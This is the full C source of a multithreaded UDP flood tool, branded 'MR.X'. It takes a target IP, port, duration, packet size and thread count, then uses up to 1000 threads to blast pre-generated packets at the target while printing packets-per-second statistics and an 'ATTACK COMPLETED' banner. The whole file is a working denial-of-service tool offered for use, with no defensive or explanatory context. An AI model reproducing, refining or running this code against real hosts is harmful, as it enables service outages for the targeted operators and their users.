#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int ready_signal = 0;
_Atomic int stop_signal = 0;
_Atomic int active_threads = 0;

#define PREGEN_COUNT 256
char *pregen_buffers[PREGEN_COUNT];
struct sockaddr_in target_addr;

void lock_cpu(int thread_id) {
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % 2, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
#endif
}

void init_pregen_buffers() {
    if (PACKET_SIZE <= 0) {
        fprintf(stderr, "Fatal: Invalid packet size %d\n", PACKET_SIZE);
        exit(EXIT_FAILURE);
    }
    
    for (int i = 0; i < PREGEN_COUNT; i++) {
        pregen_buffers[i] = malloc(PACKET_SIZE);
        if (!pregen_buffers[i]) {
            fprintf(stderr, "Fatal: malloc failed for buffer %d\n", i);
            exit(EXIT_FAILURE);
        }
        
        for (int j = 0; j < PACKET_SIZE; j++) {
            pregen_buffers[i][j] = (i + j) & 0xFF;
        }
    }
}

void cleanup_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        if (pregen_buffers[i]) {
            free(pregen_buffers[i]);
            pregen_buffers[i] = NULL;
        }
    }
}

int create_optimized_socket() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        return -1;
    }
    
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable));
    
    int sndbuf = 128 * 1024 * 1024;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        sndbuf = 0;
        socklen_t len = sizeof(sndbuf);
        getsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, &len);
    }
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    return sockfd;
}

void *attack_thread(void *arg) {
    int thread_id = *(int *)arg;
    lock_cpu(thread_id);
    
    int sockfd = create_optimized_socket();
    if (sockfd < 0) {
        atomic_fetch_sub(&active_threads, 1);
        pthread_exit(NULL);
    }
    
    atomic_fetch_add(&active_threads, 1);
    
    while (atomic_load(&ready_signal) == 0) {
        usleep(100);
    }
    
    time_t start_time = time(NULL);
    int packet_index = thread_id % PREGEN_COUNT;
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    
    while (atomic_load(&stop_signal) == 0) {
        if (time(NULL) - start_time >= ATTACK_TIME) {
            break;
        }
        
        for (int i = 0; i < 128; i++) {
            sendto(sockfd, pregen_buffers[packet_index], PACKET_SIZE, MSG_DONTWAIT,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            packet_index = (packet_index + 1) % PREGEN_COUNT;
            local_packets++;
        }
        
        local_bytes += 128 * PACKET_SIZE;
        
        if (local_packets >= 50000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    atomic_fetch_add(&total_packets, local_packets);
    atomic_fetch_add(&total_bytes, local_bytes);
    atomic_fetch_sub(&active_threads, 1);
    
    close(sockfd);
    pthread_exit(NULL);
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = 0;
    unsigned long long prev_bytes = 0;
    
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║          🚀 MR.X Starting 🔥🔥🔥           ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("📡 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %ds | 📦 Size: %d bytes \n", ATTACK_TIME, PACKET_SIZE);
    printf("🧵 Threads: %d | 🎯 Buffers: %d\n\n", THREAD_COUNT, PREGEN_COUNT);
    
    for (int second = 1; second <= ATTACK_TIME && atomic_load(&stop_signal) == 0; second++) {
        sleep(1);
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = current_packets - prev_packets;
        unsigned long long bytes_sec = current_bytes - prev_bytes;
        
        double megabytes = bytes_sec / (1024.0 * 1024.0);
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        double pps_k = pps / 1000.0;
        double peak_k = atomic_load(&peak_pps) / 1000.0;
        
        printf("🔥 PPS: %.0fK | 📈 Peak: %.0fK | 🌊 MB: %.1f\n", 
               pps_k, peak_k, megabytes);
        
        fflush(stdout);
        
        prev_packets = current_packets;
        prev_bytes = current_bytes;
    }
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_peak = atomic_load(&peak_pps);
    int threads_active = atomic_load(&active_threads);
    
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║              🎉 ATTACK COMPLETED 🎉              ║\n");
    printf("╚══════════════════════════════════════════════════╝\n\n");
    
    printf("📊 Total packets: %llu\n", final_packets);
    printf("💾 Total data: %.2f MB\n", final_bytes / (1024.0 * 1024.0));
    printf("🚀 Peak PPS: %.0fK\n", final_peak / 1000.0);
    printf("🧵 Active threads: %d/%d\n", threads_active, THREAD_COUNT);
    
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║         🚀 MR.X NEVER END 😘😘😘          ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        fprintf(stderr, "Example: %s 1.2.3.4 7777 60 92 250\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < 1 || ATTACK_TIME > 3600) {
        fprintf(stderr, "Error: Time must be 1-3600 seconds\n");
        return EXIT_FAILURE;
    }
    
    if (PACKET_SIZE < 20 || PACKET_SIZE > 1024) {
        fprintf(stderr, "Error: Packet size must be 20-1024 bytes\n");
        return EXIT_FAILURE;
    }
    
    if (THREAD_COUNT < 10 || THREAD_COUNT > 1000) {
        fprintf(stderr, "Error: Threads must be 10-1000\n");
        return EXIT_FAILURE;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) != 1) {
        fprintf(stderr, "Error: Invalid IP address: %s\n", TARGET_IP);
        return EXIT_FAILURE;
    }
    
    init_pregen_buffers();
    
    pthread_t *threads = calloc(THREAD_COUNT, sizeof(pthread_t));
    int *thread_ids = calloc(THREAD_COUNT, sizeof(int));
    
    if (!threads || !thread_ids) {
        fprintf(stderr, "Fatal: Memory allocation failed for threads\n");
        cleanup_pregen_buffers();
        return EXIT_FAILURE;
    }
    
    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]) != 0) {
            fprintf(stderr, "Warning: Failed to create thread %d\n", i);
            break;
        }
        threads_created++;
        usleep(1000);
    }
    
    printf("Created %d/%d threads\n", threads_created, THREAD_COUNT);
    
    if (threads_created == 0) {
        fprintf(stderr, "Fatal: No threads created\n");
        free(threads);
        free(thread_ids);
        cleanup_pregen_buffers();
        return EXIT_FAILURE;
    }
    
    pthread_t monitor_thread;
    if (pthread_create(&monitor_thread, NULL, stats_monitor, NULL) != 0) {
        fprintf(stderr, "Warning: Failed to create monitor thread\n");
    }
    
    sleep(3);
    atomic_store(&ready_signal, 1);
    
    sleep(ATTACK_TIME);
    atomic_store(&stop_signal, 1);
    
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    cleanup_pregen_buffers();
    free(threads);
    free(thread_ids);
    
    return EXIT_SUCCESS;
}